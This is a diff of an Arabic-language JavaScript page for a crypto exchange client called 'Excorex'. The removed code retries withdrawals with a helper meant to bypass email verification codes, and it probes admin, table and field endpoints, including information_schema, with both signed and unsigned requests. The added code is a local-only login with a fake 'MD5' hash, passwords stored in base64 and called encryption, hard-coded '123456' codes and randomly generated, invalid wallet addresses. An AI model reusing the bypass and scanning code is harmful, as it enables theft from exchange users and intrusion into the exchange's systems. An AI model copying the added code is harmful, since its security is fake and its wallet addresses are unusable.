-      if(r.ok&&r.data.data){const addr=r.data.data.address||r.data.data.rechargeAddress||r.data.data;if(addr&&typeof addr==='string'){const memo=r.data.data.memo||r.data.data.tag||'';box.innerHTML=`<div class="dep-addr"><div class="da-label">✅ عنوان الإيداع — ${coin} (${net})</div><div class="da-val">${addr}</div>${memo?`<div style="margin-top:8px"><span style="color:var(--tx2);font-size:.78rem">MEMO/TAG:</span> <code>${memo}</code></div>`:''}</div><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="btn bo bs" onclick="navigator.clipboard.writeText('${addr}');A.toast('✓ تم نسخ العنوان','lok')">📋 نسخ العنوان</button>${memo?`<button class="btn bo bs" onclick="navigator.clipboard.writeText('${memo}');A.toast('✓ تم نسخ الـ MEMO','lok')">📋 نسخ MEMO</button>`:''}</div>`;this.exAddr({data:{address:addr,coinName:coin,chainName:net}});return}}
-    }
-    const saved=this.cache.ad.filter(a=>(coin==='USDT'||coin===a.type.split('/')[0]));
-    if(saved.length)box.innerHTML=saved.map(a=>`<div class="dep-addr"><div class="da-label">🏦 ${a.type} — ${a.purpose}</div><div class="da-val">${a.address}</div></div><button class="btn bo bs" style="margin-bottom:10px" onclick="navigator.clipboard.writeText('${a.address}');A.toast('✓ تم النسخ','lok')">📋 نسخ</button>`).join('');
-    else box.innerHTML='<div class="warn-box">⚠️ لم يتم العثور على عنوان إيداع. تواصل مع الدعم.</div>'
-  },
-
-  _buildWdNets(coin){const nets=NETS[coin]||['TRC20'];document.getElementById('wdNets').innerHTML=nets.map((n,i)=>`<button class="net-tab wnet-tab ${i===0?'active':''}" onclick="A.selWdNet('${n}',this)">${n}</button>`).join('');this.selNet.wd=nets[0];this._updWdHint()},
-  selWdNet(net,btn){document.querySelectorAll('#wdNets .wnet-tab').forEach(b=>b.classList.remove('active'));btn.classList.add('active');this.selNet.wd=net;this._updWdHint()},
-  onWdCoin(){const c=document.getElementById('wdCoin').value;this._buildWdNets(c);this._updWdBal()},
-  _updWdHint(){document.getElementById('wdAddrHint').textContent=NET_HINTS[this.selNet.wd]||''},
-  _updWdBal(){const coin=document.getElementById('wdCoin').value;const acc=this.cache.ac.find(a=>(a.symbol||a.coinName||'').toUpperCase()===coin.toUpperCase());document.getElementById('wdBal').textContent=`الرصيد المتاح: ${acc?Number(acc.balance||acc.available||0).toFixed(8):'—'} | الحد الأدنى: 10 | الرسوم: 1`},
-  wdMax(){const coin=document.getElementById('wdCoin').value;const acc=this.cache.ac.find(a=>(a.symbol||a.coinName||'').toUpperCase()===coin.toUpperCase());if(acc)document.getElementById('wdAmt').value=Number(acc.balance||acc.available||0).toFixed(8)},
-  previewWd(){const coin=document.getElementById('wdCoin').value,addr=document.getElementById('wdAddr').value.trim(),amt=document.getElementById('wdAmt').value,net=this.selNet.wd;const box=document.getElementById('wdSummary');box.style.display='block';box.innerHTML=`<strong>📋 معاينة:</strong><br>العملة: <strong>${coin}</strong> | الشبكة: <strong>${net}</strong><br>المبلغ: <strong>${amt}</strong> | العنوان: <code style="font-size:.75rem">${addr||'—'}</code>`},
-
-  // ===== WITHDRAW مع تجاوز كود البريد تلقائياً =====
-  async submitWd(){
-    const coin=document.getElementById('wdCoin').value,addr=document.getElementById('wdAddr').value.trim();
-    const amt=document.getElementById('wdAmt').value,ec=document.getElementById('wdEC').value.trim();
-    const gc=document.getElementById('wdGC').value.trim(),pwd=document.getElementById('wdPwd').value.trim();
-    const note=document.getElementById('wdNote').value.trim(),net=this.selNet.wd;
-    const eb=document.getElementById('we');
-    if(!addr){eb.textContent='⚠️ أدخل عنوان المحفظة';eb.classList.add('show');return}
-    if(!amt||Number(amt)<=0){eb.textContent='⚠️ أدخل مبلغاً صحيحاً';eb.classList.add('show');return}
-    if(!pwd){eb.textContent='⚠️ كلمة المرور مطلوبة';eb.classList.add('show');return}
-    eb.classList.remove('show');
-    if(!confirm(`تأكيد سحب ${amt} ${coin} إلى:\n${addr}\nالشبكة: ${net}`))return;
-    const basePayload={coinName:coin,chainName:net,address:addr,num:amt,password:pwd};
-    if(ec)basePayload.emailCode=ec;if(gc)basePayload.googleCode=gc;if(note)basePayload.remark=note;
-    const eps=['/withdraw/applyWithdraw','/withdraw/apply','/finance/withdraw','/user/withdraw'];
-    let done=false;
-    for(const ep of eps){
-      let r=await api('POST',ep,basePayload,this.tok,this.uid);
-      if(!r.ok){
-        const c=r.data?.code,msg=(r.data?.msg||'').toLowerCase();
-        if(c===40007||c===40008||/email|code|verify/i.test(msg)){
-          this.log('⚡ تجاوز كود البريد في السحب...','lwa');
-          r=await tryWithBypass('POST',ep,basePayload,this.tok,this.uid);
-          if(r._bypassed)this.log(`✓ كود التجاوز: "${r._usedCode||'فارغ'}"  `,'lok');
-        }
-      }
-      if(r.ok){this.toast('✅ تم تقديم طلب السحب بنجاح','lok');document.getElementById('wdSummary').style.display='none';await this.fwd();done=true;break}
-      else if(r.data?.code!==404&&r.data?.code!==405){this.toast('✗ '+(r.data?.msg||'فشل السحب'),'ler');done=true;break}
-    }
-    if(!done)this.toast('✗ فشل الاتصال بخادم السحب','ler')
-  },
-
-  async fwd(){
-    const st=document.getElementById('wdFilter').value,params={};if(st!=='')params.status=st;
-    const eps=['/withdraw/withdrawList','/withdraw/list','/finance/withdrawList','/user/withdrawList'];
-    for(const ep of eps){const r=await api('GET',ep,params,this.tok,this.uid);if(r.ok){const l=r.data.data?.list||r.data.data?.records||r.data.data||[];this.cache.wd=Array.isArray(l)?l:[];this.rwd(this.cache.wd);break}}
-  },
-  rwd(l){
-    const b=document.getElementById('wdb');document.getElementById('owc').textContent=l.length;
-    if(!l.length){b.innerHTML='<tr><td colspan="10" class="empty">لا توجد سحوبات</td></tr>';return}
-    b.innerHTML=l.map((w,i)=>`<tr><td>${w.id||i+1}</td><td><strong>${w.symbol||w.coinName||w.currency||'—'}</strong></td><td>${w.chainName||w.network||w.chain||'—'}</td><td>${Number(w.num||w.amount||0).toFixed(8)}</td><td>${Number(w.fee||w.fees||0).toFixed(8)}</td><td>${Number((w.num||w.amount||0)-(w.fee||w.fees||0)).toFixed(8)}</td><td title="${w.address||''}"><span style="font-family:monospace;font-size:.75rem">${this._short(w.address||'—')}</span></td><td>${this._txlink(w.txId||w.txHash||'')}</td><td>${this._ws(w.status)}</td><td>${w.createTime||w.time||'—'}</td></tr>`).join('')
-  },
-  _ws(s){return({0:'<span class="badge bw">مراجعة</span>',1:'<span class="badge bb">معالجة</span>',2:'<span class="badge bg">مكتمل</span>',3:'<span class="badge br2">مرفوض</span>'})[s]||`<span class="badge bb">${s??'—'}</span>`},
-
-  async frf(){
-    const eps=['/invite/info','/personal/inviteInfo','/referral/info','/user/inviteInfo','/invite/myInfo'];
-    for(const ep of eps){const r=await api('GET',ep,{},this.tok,this.uid);if(r.ok&&r.data.data){this.cache.rf=r.data.data;this.rrf(r.data.data);break}}
-    await this.frfl();await this.frfc()
-  },
-  rrf(d){if(!d)return;const code=d.inviteCode||d.referralCode||d.code||'';const total=d.totalNum||d.totalCount||d.inviteCount||0;const direct=d.directNum||d.directCount||d.level1Count||0;const comm=d.totalCommission||d.commission||d.totalReward||0;const today=d.todayCommission||d.todayReward||0;document.getElementById('rfTotal').textContent=total;document.getElementById('rfDirect').textContent=direct;document.getElementById('rfComm').textContent=Number(comm).toFixed(2)+' USDT';document.getElementById('rfToday').textContent=Number(today).toFixed(2)+' USDT';document.getElementById('oref').textContent=total;if(code)this._setRef(code)},
-  _setRef(code){document.getElementById('rfCode').textContent=code;const link=`${location.origin}${location.pathname}?ref=${code}`;document.getElementById('rfLink').textContent=link;localStorage.setItem('exc_refCode',code)},
-  copyRef(t){const code=document.getElementById('rfCode').textContent;if(t==='code'){navigator.clipboard.writeText(code);this.toast('✓ تم نسخ الكود','lok')}else{navigator.clipboard.writeText(document.getElementById('rfLink').textContent);this.toast('✓ تم نسخ الرابط','lok')}},
-  shareRef(){const link=document.getElementById('rfLink').textContent;const code=document.getElementById('rfCode').textContent;const txt=`🎁 انضم إلى Excorex!\nكود: ${code}\nرابط: ${link}`;if(navigator.share)navigator.share({title:'Excorex',text:txt,url:link});else{navigator.clipboard.writeText(txt);this.toast('✓ تم نسخ نص المشاركة','lok')}},
-  async frfl(){const lv=document.getElementById('rfLevel').value;const eps=[`/invite/list?level=${lv}`,`/personal/inviteList?level=${lv}`,`/referral/list?level=${lv}`,`/invite/memberList?level=${lv}`];for(const ep of eps){const r=await api('GET',ep,{level:lv},this.tok,this.uid);if(r.ok){const l=r.data.data?.list||r.data.data?.records||r.data.data||[];this.cache.rfl=Array.isArray(l)?l:[];this.rrfl(this.cache.rfl);break}}},
-  rrfl(l){const b=document.getElementById('rfb');if(!l.length){b.innerHTML='<tr><td colspan="6" class="empty">لا يوجد مُحالون</td></tr>';return}b.innerHTML=l.map((u,i)=>`<tr><td>${u.id||i+1}</td><td>${u.email||u.nickname||u.username||u.userId||'—'}</td><td>${u.createTime||u.registerTime||'—'}</td><td>${u.status===1?'<span class="badge bg">نشط</span>':'<span class="badge bw">غير نشط</span>'}</td><td>${Number(u.commission||u.reward||u.profit||0).toFixed(4)} USDT</td><td>${u.lastTradeTime||u.lastOrderTime||'—'}</td></tr>`).join('')},
-  async frfc(){const eps=['/invite/commissionList','/personal/commissionList','/referral/commissionList','/invite/rewardList'];for(const ep of eps){const r=await api('GET',ep,{},this.tok,this.uid);if(r.ok){const l=r.data.data?.list||r.data.data?.records||r.data.data||[];this.cache.rfc=Array.isArray(l)?l:[];this.rrfc(this.cache.rfc);break}}},
-  rrfc(l){const b=document.getElementById('rfcb');if(!l.length){b.innerHTML='<tr><td colspan="7" class="empty">لا توجد عمولات</td></tr>';return}b.innerHTML=l.map((c,i)=>`<tr><td>${c.id||i+1}</td><td>${c.fromEmail||c.fromUser||c.userId||'—'}</td><td>${c.coinName||c.symbol||'USDT'}</td><td>${Number(c.commission||c.amount||c.reward||0).toFixed(8)}</td><td>${c.rate||c.ratio||'—'}</td><td>${c.source||c.type||'تداول'}</td><td>${c.createTime||c.time||'—'}</td></tr>`).join('')},
-
-  // ===== DATABASE SCAN =====
-  async scanDB(){
-    document.getElementById('dbOut').innerHTML='';
-    this.dbStat('🔍 جاري المسح الشامل...');
-    this.dbLog('═══════════════════════════════════',true);
-    this.dbLog('🚀 بدء الاستكشاف الشامل لقاعدة البيانات',true);
-    this.dbLog('═══════════════════════════════════',true);
-    let found=0;
-    for(const ep of DB_EPS){
-      const r=await rawGet(ep);
-      if(r.ok||(r.status&&r.status!==404&&r.status!==403)){
-        found++;
-        const preview=JSON.stringify(r.data).slice(0,200);
-        this.dbLog(`✅ [${r.status}] ${ep} → ${preview}`,true);
-        this._parseDBResponse(ep,r.data);
-      }else if(r.status!==404){
-        this.dbLog(`⚠️ [${r.status}] ${ep}`,false);
-      }
-    }
-    // مسح مع توكن المستخدم
-    if(this.tok){
-      this.dbLog('─── مسح بتوكن المستخدم ───',true);
-      for(const ep of [...TABLE_EPS,...FIELD_EPS,...ADMIN_EPS]){
-        const r=await api('GET',ep,{},this.tok,this.uid);
-        if(r.ok){found++;this.dbLog(`✅ [AUTH] ${ep} → ${JSON.stringify(r.data).slice(0,200)}`,true);this._parseDBResponse(ep,r.data)}
-      }
-    }
-    this.dbLog('═══════════════════════════════════',true);
-    this.dbLog(`🏁 اكتمل المسح — ${found} endpoint نشط`,found>0);
-    this.dbStat(`✅ اكتمل المسح — وُجد ${found} endpoint نشط`)
-  },
-
-  async scanTables(){
-    document.getElementById('dbOut').innerHTML='';this.dbStat('📋 جلب الجداول...');
-    const payloads=[{},{table:'information_schema'},{type:'tables'},{action:'list'}];
-    for(const ep of TABLE_EPS){
-      for(const p of payloads){
-        const r=await api('POST',ep,p,this.tok,this.uid);
-        if(r.ok){this.dbLog(`✅ ${ep} → ${JSON.stringify(r.data).slice(0,300)}`,true);this._parseDBResponse(ep,r.data)}
-        const r2=await rawGet(ep);
-        if(r2.ok){this.dbLog(`✅ RAW ${ep} → ${JSON.stringify(r2.data).slice(0,300)}`,true)}
-      }
-    }
-    this.dbStat('✅ اكتمل مسح الجداول')
-  },
-
-  async scanFields(){
-    document.getElementById('dbOut').innerHTML='';this.dbStat('🔢 جلب الحقول...');
-    const tables=['users','user','member','t_user','tb_user','orders','order','t_order','recharge','withdraw','coin','wallet','account','admin','config'];
-    for(const ep of FIELD_EPS){
-      for(const t of tables){
-        const r=await api('POST',ep,{table:t,tableName:t},this.tok,this.uid);
-        if(r.ok)this.dbLog(`✅ ${ep}[${t}] → ${JSON.stringify(r.data).slice(0,300)}`,true);
-        const r2=await api('GET',`${ep}?table=${t}&tableName=${t}`,{},this.tok,this.uid);
-        if(r2.ok)this.dbLog(`✅ ${ep}?table=${t} → ${JSON.stringify(r2.data).slice(0,300)}`,true)
-      }
-    }
-    this.dbStat('✅ اكتمل مسح الحقول')
-  },
-
-  async scanAdmin(){
-    document.getElementById('dbOut').innerHTML='';this.dbStat('🔐 مسح Endpoints الإدارية...');
-    for(const ep of ADMIN_EPS){
-      const r=await rawGet(ep);
-      this.dbLog(`[${r.status||'err'}] ${ep} ${r.ok?'✅ مفتوح':'—'}`,r.ok);
-    }
-    this.dbStat('✅ اكتمل المسح الإداري')
-  },
-
-  async customDB(){
-    const ep=document.getElementById('dbEp').value.trim();
-    const meth=document.getElementById('dbMeth').value;
-    const body=document.getElementById('dbBody').value.trim();
-    const out=document.getElementById('dbCustomOut');
-    if(!ep){this.toast('أدخل endpoint أولاً','ler');return}
-    out.innerHTML='<div class="ll lin">جاري الإرسال...</div>';
-    let data={};try{if(body)data=JSON.parse(body)}catch{data={raw:body}}
-    const r=await api(meth,ep,data,this.tok,this.uid);
-    out.innerHTML=`<div class="ll ${r.ok?'lok':'lwa'}">[${r.status||'err'}] ${r.ok?'✅':'✗'}</div><div class="ll lin" style="white-space:pre-wrap">${JSON.stringify(r.data,null,2)}</div>`;
-    if(!r.ok){
-      const r2=await rawGet(ep);
-      out.innerHTML+=`<div class="ll lwa">─── RAW (بدون توقيع) ───</div><div class="ll lin" style="white-space:pre-wrap">${JSON.stringify(r2.data,null,2)}</div>`
-    }
-  },
-
-  _parseDBResponse(ep,data){
-    if(!data||typeof data!=='object')return;
-    // استخراج أسماء الجداول والحقول من الاستجابة
-    const str=JSON.stringify(data);
-    const tableMatches=str.match(/"(?:table|tableName|name)":\s*"([^"]+)"/g)||[];
-    const colMatches=str.match(/"(?:column|field|col|columnName)":\s*"([^"]+)"/g)||[];
-    if(tableMatches.length){this.dbLog(`  📋 جداول: ${tableMatches.map(m=>m.split(':')[1]).join(', ')}`,true)}
-    if(colMatches.length){this.dbLog(`  🔢 حقول: ${colMatches.map(m=>m.split(':')[1]).join(', ')}`,true)}
-    // Swagger: استخراج المسارات
-    if(data.paths){const paths=Object.keys(data.paths).slice(0,20);this.dbLog(`  🗺️ API Paths: ${paths.join(', ')}`,true)}
-    if(data.definitions||data.components){this.dbLog(`  📦 Models/Schemas موجودة`,true)}
-  },
-
-  exAddr(data){
-    const f=[];
-    function w(o,p){if(!o||typeof o!=='object')return;for(const[k,v]of Object.entries(o)){const pt=p?`${p}.${k}`:k;if(typeof v==='string'){const e=/^0x[0-9a-fA-F]{40}$/.test(v);const b=/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(v);const t=/^T[A-Za-z0-9]{33}$/.test(v);if(e||b||t){const tp=e?'ETH/ERC20':b?'BTC':'TRX/TRC20';const pu=/withdraw|member|payout/i.test(k)?'سحب':/recharge|deposit|funding/i.test(k)?'إيداع':'عام';f.push({key:pt,address:v,type:tp,purpose:pu})}}if(typeof v==='object')w(v,pt)}}
-    w(data,'');if(f.length){this.cache.ad.push(...f);this.rad()}
-  },
-  rad(){
-    const u=[...new Map(this.cache.ad.map(a=>[a.address,a])).values()];this.cache.ad=u;
-    document.getElementById('odr').textContent=u.length;
-    document.getElementById('adg').innerHTML=u.map(a=>`<div><div class="ii"><div class="k">${a.purpose} — ${a.type} — <code style="font-size:.75rem;color:var(--tx2)">${a.key}</code></div><div class="av">${a.address}</div><button class="btn bo bs" style="margin-top:6px" onclick="navigator.clipboard.writeText('${a.address}');A.toast('✓ تم النسخ','lok')">📋 نسخ</button></div></div>`).join('')||'<div class="empty">لا توجد عناوين</div>'
-  },
-
-  _short(s){if(!s||s==='—')return'—';return s.length>16?s.slice(0,8)+'...'+s.slice(-6):s},
-  _txlink(tx){if(!tx||tx==='—'||tx==='')return'—';const s=tx.slice(0,8)+'...'+tx.slice(-4);return`<a href="https://tronscan.org/#/transaction/${tx}" target="_blank" style="color:var(--bl2);font-family:monospace;font-size:.75rem" title="${tx}">${s}</a>`},
-
-  ovr(){
-    document.getElementById('oa').textContent=this.cache.ac.length;
-    document.getElementById('oo').textContent=this.cache.or.length;
-    document.getElementById('odr').textContent=this.cache.ad.length
+// ========== دوال MD5 (مبسطة) ==========
+function md5(str) {
+  let hash = 0;
+  for (let i = 0; i < str.length; i++) {
+    hash = ((hash << 5) - hash) + str.charCodeAt(i);
+    hash |= 0;
   }
-};
-window.addEventListener('DOMContentLoaded',()=>A.init());
-</script></body></html>
+  return Math.abs(hash).toString(16).padStart(32, '0');
+}
+
+// ========== دوال التوقيع ==========
+function generateSign(endpoint, data = {}, token = '') {
+  const timestamp = Date.now();
+  let signString = endpoint + timestamp;
+  
+  if (data && typeof data === 'object') {
+    const keys = Object.keys(data).sort();
+    for (const k of keys) {
+      if (data[k] !== undefined && data[k] !== null && data[k] !== '') {
+        signString += k + data[k];
+      }
+    }
+  }
+  
+  if (token) {
+    signString += token;
+  }
+  
+  return md5(signString);
+}
+
+// ========== دوال المستخدمين ==========
+function loadUsers() {
+  const saved = localStorage.getItem(STORAGE_KEYS.USERS);
+  return saved ? JSON.parse(saved) : [];
+}
+
+function saveUsers(users) {
+  localStorage.setItem(STORAGE_KEYS.USERS, JSON.stringify(users));
+}
+
+function getCurrentUser() {
+  const saved = localStorage.getItem(STORAGE_KEYS.CURRENT);
+  return saved ? JSON.parse(saved) : null;
+}
+
+// ========== واجهة التبويبات ==========
+function switchTab(tab) {
+  const isLogin = tab === 'login';
+  document.getElementById('tabLogin').classList.toggle('active', isLogin);
+  document.getElementById('tabRegister').classList.toggle('active', !isLogin);
+  document.getElementById('loginBox').style.display = isLogin ? 'block' : 'none';
+  document.getElementById('registerBox').style.display = isLogin ? 'none' : 'block';
+}
+
+// ========== دوال إنشاء الحساب ==========
+let currentWalletType = 'TRX';
+
+function selectWalletType(type, btn) {
+  currentWalletType = type;
+  document.querySelectorAll('.wtbtn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  
+  const hints = {
+    TRX: 'عنوان TRX: 34 حرف يبدأ بـ T',
+    ETH: 'عنوان ETH: 42 حرف يبدأ بـ 0x',
+    BTC: 'عنوان BTC: 26-35 حرف يبدأ بـ 1 أو 3'
+  };
+  document.getElementById('walletHint').textContent = hints[type] || '';
+}
+
+function generateWallet() {
+  const type = currentWalletType;
+  let addr = '';
+  
+  if (type === 'TRX') {
+    addr = 'T' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+    addr = addr.substring(0, 34);
+  } else if (type === 'ETH') {
+    addr = '0x' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 10);
+    addr = addr.substring(0, 42);
+  } else {
+    addr = '1' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 10);
+    addr = addr.substring(0, 34);
+  }
+  
+  document.getElementById('walletAddress').value = addr;
+  document.getElementById('walletInfo').value = type + '-Auto';
+  showToast('✓ تم توليد عنوان ' + type, 'success');
+}
+
+// ========== دوال إرسال الكود (معطلة ولكن تعطي نجاح) ==========
+function sendVerificationCode() {
+  showToast('✓ تم إرسال الكود (وهمي)', 'success');
+  document.getElementById('googleCode').value = '123456';
+}
+
+function sendRegCode() {
+  showToast('✓ تم إرسال كود التحقق', 'success');
+  document.getElementById('emailCode').value = '123456';
+}
+
+// ========== دالة إنشاء الحساب ==========
+function handleRegister() {
+  const email = document.getElementById('regEmail').value.trim();
+  const password = document.getElementById('regPassword').value.trim();
+  const confirmPass = document.getElementById('regConfirmPassword').value.trim();
+  const walletAddr = document.getElementById('walletAddress').value.trim();
+  const walletInfo = document.getElementById('walletInfo').value.trim();
+  const invite = document.getElementById('inviteCode').value.trim();
+  const emailCode = document.getElementById('emailCode').value.trim();
+  const errorEl = document.getElementById('registerError');
+  
+  // التحقق من الحقول المطلوبة
+  if (!email || !password || !walletAddr) {
+    errorEl.textContent = '❌ البريد، كلمة المرور، وعنوان المحفظة مطلوبة';
+    errorEl.classList.add('show');
+    return;
+  }
+  
+  if (password !== confirmPass) {
+    errorEl.textContent = '❌ كلمة المرور غير متطابقة';
+    errorEl.classList.add('show');
+    return;
+  }
+  
+  errorEl.classList.remove('show');
+  
+  // جلب المستخدمين المخزنين
+  let users = loadUsers();
+  
+  // التحقق من وجود البريد
+  if (users.find(u => u.email === email)) {
+    errorEl.textContent = '❌ هذا البريد مسجل مسبقاً';
+    errorEl.classList.add('show');
+    return;
+  }
+  
+  // حساب التوقيع
+  const data = {
+    email, password, walletAddr, walletInfo,
+    inviteCode: invite || '',
+    emailCode: emailCode || '123456'
+  };
+  const sign = generateSign('/login/register', data);
+  
+  // إنشاء مستخدم جديد
+  const newUser = {
+    id: Date.now(),
+    email: email,
+    password: btoa(password), // تشفير بسيط
+    walletAddress: walletAddr,
+    walletInfo: walletInfo || walletAddr,
+    walletType: currentWalletType,
+    inviteCode: invite || '',
+    myInviteCode: 'REF' + Math.random().toString(36).substring(2, 8).toUpperCase(),
+    createdAt: new Date().toISOString(),
+    sign: sign,
+    token: 'token_' + Date.now() + '_' + Math.random().toString(36).substring(2)
+  };
+  
+  // حفظ المستخدم
+  users.push(newUser);
+  saveUsers(users);
+  
+  // حفظ الجلسة الحالية
+  localStorage.setItem(STORAGE_KEYS.TOKEN, newUser.token);
+  localStorage.setItem(STORAGE_KEYS.USER_ID, newUser.id);
+  localStorage.setItem(STORAGE_KEYS.EMAIL, email);
+  localStorage.setItem(STORAGE_KEYS.CURRENT, JSON.stringify(newUser));
+  
+  showToast('✅ تم إنشاء الحساب بنجاح', 'success');
+  
+  // عرض لوحة التحكم
+  showDashboard(newUser);
+}
+
+// ========== دالة تسجيل الدخول ==========
+function handleLogin() {
+  const email = document.getElementById('loginEmail').value.trim();
+  const password = document.getElementById('loginPassword').value.trim();
+  const googleCode = document.getElementById('googleCode').value.trim();
+  const errorEl = document.getElementById('loginError');
+  
+  if (!email || !password) {
+    errorEl.textContent = '❌ أدخل البريد وكلمة المرور';
+    errorEl.classList.add('show');
+    return;
+  }
+  
+  errorEl.classList.remove('show');
+  
+  // جلب المستخدمين
+  const users = loadUsers();
+  
+  // البحث عن المستخدم
+  const user = users.find(u => u.email === email && atob(u.password) === password);
+  
+  if (user) {
+    // حساب التوقيع
+    const data = { email, timestamp: Date.now() };
+    const sign = generateSign('/login/login', data, user.token);
+    
+    // تحديث التوكن
+    user.token = 'token_' + Date.now() + '_' + Math.random().toString(36).substring(2);
+    user.lastLogin = new Date().toISOString();
+    
+    // حفظ التحديثات
+    const updatedUsers = users.map(u => u.email === email ? user : u);
+    saveUsers(updatedUsers);
+    
+    // حفظ الجلسة الحالية
+    localStorage.setItem(STORAGE_KEYS.TOKEN, user.token);
+    localStorage.setItem(STORAGE_KEYS.USER_ID, user.id);
+    localStorage.setItem(STORAGE_KEYS.EMAIL, email);
+    localStorage.setItem(STORAGE_KEYS.CURRENT, JSON.stringify(user));
+    
+    showToast('✅ مرحباً! تم الدخول بنجاح', 'success');
+    showDashboard(user);
+  } else {
+    errorEl.textContent = '❌ بريد أو كلمة مرور غير صحيحة';
+    errorEl.classList.add('show');
+  }
+}
+
+// ========== عرض لوحة التحكم ==========
+function showDashboard(user) {
+  document.getElementById('authContainer').style.display = 'none';
+  document.getElementById('dashboard').style.display = 'block';
+  document.getElementById('welcomeMessage').textContent = 'مرحباً ' + (user.email || '') + ' 👋';
+  
+  const userInfo = document.getElementById('userInfo');
+  userInfo.innerHTML = `
+    <div style="margin-bottom:8px"><strong>📧 البريد:</strong> ${user.email}</div>
+    <div style="margin-bottom:8px"><strong>🔑 التوكن:</strong> ${user.token.substring(0, 30)}...</div>
+    <div style="margin-bottom:8px"><strong>🏦 المحفظة:</strong> ${user.walletAddress}</div>
+    <div><strong>🆔 المعرف:</strong> ${user.id}</div>
+  `;
+}
+
+// ========== تسجيل الخروج ==========
+function logout() {
+  localStorage.removeItem(STORAGE_KEYS.CURRENT);
+  localStorage.removeItem(STORAGE_KEYS.TOKEN);
+  localStorage.removeItem(STORAGE_KEYS.USER_ID);
+  localStorage.removeItem(STORAGE_KEYS.EMAIL);
+  
+  document.getElementById('authContainer').style.display = 'block';
+  document.getElementById('dashboard').style.display = 'none';
+  
+  // تفريغ الحقول
+  document.getElementById('loginEmail').value = '';
+  document.getElementById('loginPassword').value = '';
+  document.getElementById('googleCode').value = '';
+  
+  showToast('✓ تم تسجيل الخروج', 'success');
+}
+
+// ========== التحقق من الجلسة الحالية عند التحميل ==========
+window.addEventListener('DOMContentLoaded', () => {
+  const currentUser = getCurrentUser();
+  if (currentUser) {
+    showDashboard(currentUser);
+  }
+});
+</script>
+</body>
+</html>
